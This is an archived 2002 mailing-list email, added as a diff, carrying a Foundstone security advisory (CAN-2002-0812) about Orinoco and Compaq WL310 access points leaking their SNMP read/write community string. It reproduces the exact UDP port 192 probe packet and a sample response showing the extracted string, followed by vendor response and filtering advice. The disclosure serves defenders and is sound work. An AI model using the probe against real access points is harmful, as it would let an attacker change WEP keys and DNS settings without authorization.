@@ -1,0 +1,132 @@
+From vulnwatch-return-432-jm=jmason.org@vulnwatch.org  Mon Aug 12 10:49:37 2002
+Return-Path: <vulnwatch-return-432-yyyy=spamassassin.taint.org@vulnwatch.org>
+Delivered-To: yyyy@localhost.netnoteinc.com
+Received: from localhost (localhost [127.0.0.1])
+	by phobos.labs.netnoteinc.com (Postfix) with ESMTP id 54D0B43FB1
+	for <jm@localhost>; Mon, 12 Aug 2002 05:49:36 -0400 (EDT)
+Received: from phobos [127.0.0.1]
+	by localhost with IMAP (fetchmail-5.9.0)
+	for jm@localhost (single-drop); Mon, 12 Aug 2002 10:49:36 +0100 (IST)
+Received: from vikki.vulnwatch.org ([199.233.98.101]) by
+    dogma.slashnull.org (8.11.6/8.11.6) with SMTP id g79Ietb20478 for
+    <jm@jmason.org>; Fri, 9 Aug 2002 19:40:55 +0100
+Received: (qmail 32055 invoked by alias); 9 Aug 2002 18:58:56 -0000
+Mailing-List: contact vulnwatch-help@vulnwatch.org; run by ezmlm
+Precedence: bulk
+List-Post: <mailto:vulnwatch@vulnwatch.org>
+List-Help: <mailto:vulnwatch-help@vulnwatch.org>
+List-Unsubscribe: <mailto:vulnwatch-unsubscribe@vulnwatch.org>
+List-Subscribe: <mailto:vulnwatch-subscribe@vulnwatch.org>
+Delivered-To: mailing list vulnwatch@vulnwatch.org
+Delivered-To: moderator for vulnwatch@vulnwatch.org
+Received: (qmail 24318 invoked from network); 9 Aug 2002 18:57:50 -0000
+X-Mimeole: Produced By Microsoft Exchange V6.0.5762.3
+Content-Class: urn:content-classes:message
+MIME-Version: 1.0
+Content-Type: text/plain; charset="US-ASCII"
+Date: Fri, 9 Aug 2002 11:12:04 -0700
+Message-Id: <9DC8A3D37E31E043BD516142594BDDFAC476B0@MISSION.foundstone.com>
+X-MS-Has-Attach: 
+X-MS-Tnef-Correlator: 
+Thread-Topic: Foundstone Labs Advisory - Information Leakage in Orinoco
+    and Compaq Access Points
+Thread-Index: AcI/0CLtBmJ6suMUTl62TDkDlsvtzw==
+From: "Foundstone Labs" <labs@foundstone.com>
+To: <da@securityfocus.com>, <vulnwatch@vulnwatch.org>
+Subject: [VulnWatch] Foundstone Labs Advisory - Information Leakage in Orinoco and Compaq Access Points
+Content-Transfer-Encoding: 8bit
+X-MIME-Autoconverted: from quoted-printable to 8bit by dogma.slashnull.org
+    id g79Ietb20478
+
+Foundstone Labs Advisory - 080902-APIL
+
+Advisory Name:	Information Leakage in Orinoco and Compaq Access Points
+ Release Date:	August 9th, 2002
+  Application:	Orinoco Residential Gateway and Compaq WL310
+    Platforms:	N/A
+     Severity:	The ability to display/modify configuration information
+      Vendors:	Orinoco (http://www.orinocowireless.com) and
+                  Compaq (http://www.compaq.com)
+      Authors:	Marshall Beddoe (marshall.beddoe@foundstone.com)
+                  Tony Bettini (tony.bettini@foundstone.com)
+CVE Candidate:	CAN-2002-0812
+    Reference:	http://www.foundstone.com/advisories
+
+Overview:
+
+An information leakage vulnerability exists in Orinoco and Compaq OEM 
+access points, disclosing the unique SNMP community string. As a result,
+
+an attacker can query the community string and gain the ability to
+change
+system configuration including Wired Equivalent Privacy (WEP) keys and 
+Domain Name Service (DNS) information.
+
+Detailed Description:
+
+The Compaq WL310 is an OEM Orinoco Residential Gateway access point.
+Both the Compaq and Orinoco access points use a unique identification
+number
+found on the bottom of the access point for configuration through
+their management client. This identification string is used as the
+default SNMP read/write community string. The community strings appears
+to be unchangable, unique, and not easily guessable. By sending a
+specific packet to UDP port 192, the access point will return
+information including the firmware version and the unique identification
+value. The packet returned includes the value of system.sysName.0, which
+in the case of the Compaq WL310 and Orinoco Residential Gateway,
+includes
+the unique identification value. The identification value can then be
+used as the SNMP community string to view and modify the configuration.
+
+The probe packet:
+"\x01\x00\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+Example probe response:
+01 01 00 00 00 00 00 00  00 00 00 00 00 00 00 00  | ................
+00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  | ................
+00 00 00 00 00 60 1d 20  2e 38 00 00 18 19 10 f8  | .....`. .8......
+4f 52 69 4e 4f 43 4f 20  52 47 2d 31 31 30 30 20  | ORiNOCO RG-1100
+30 33 39 32 61 30 00 00  00 00 00 00 00 00 00 00  | 0392a0..........
+02 8f 24 02 52 47 2d 31  31 30 30 20 56 33 2e 38  | ..$.RG-1100 V3.8
+33 20 53 4e 2d 30 32 55  54 30 38 32 33 32 33 34  | 3 SN-02UT0823234
+32 20 56 00                                       | 2 V.
+
+system.sysName.0 = "ORiNOCO RG-1100 0392a0"
+Community name: 0392a0
+
+Vendor Response:
+
+Both vendors were notified of this issue on July 8th, 2002. According
+to Orinoco, "The Residential Gateway line has been discontinued."
+
+Solution:
+
+Employ packet filtering on inbound requests to deny access to ports
+192/udp and 161/udp on the access point.
+
+FoundScan has been updated to check for this vulnerability. For more
+information on FoundScan, see the Foundstone website:
+http://www.foundstone.com
+
+Disclaimer:
+
+The information contained in this advisory is copyright (c) 2002 
+Foundstone, Inc. and is believed to be accurate at the time of 
+publishing, but no representation of any warranty is given, 
+express, or implied as to its accuracy or completeness. In no 
+event shall the author or Foundstone be liable for any direct, 
+indirect, incidental, special, exemplary or consequential 
+damages resulting from the use or misuse of this information.  
+This advisory may be redistributed, provided that no fee is 
+assigned and that the advisory is not modified in any way.
+
+
+
